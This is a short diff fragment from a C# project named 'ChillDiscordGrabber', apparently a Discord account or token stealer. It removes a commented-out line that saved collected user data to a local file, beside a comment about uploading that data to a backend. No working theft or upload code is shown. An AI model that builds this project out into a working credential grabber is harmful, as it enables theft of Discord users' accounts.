@@ -42,7 +42,6 @@ namespace ChillDiscordGrabber
 
 
             //To implement uploading the data to a backend
-            //File.WriteAllText("out.json", JsonConvert.SerializeObject(user));
             Upload:
             try
             {
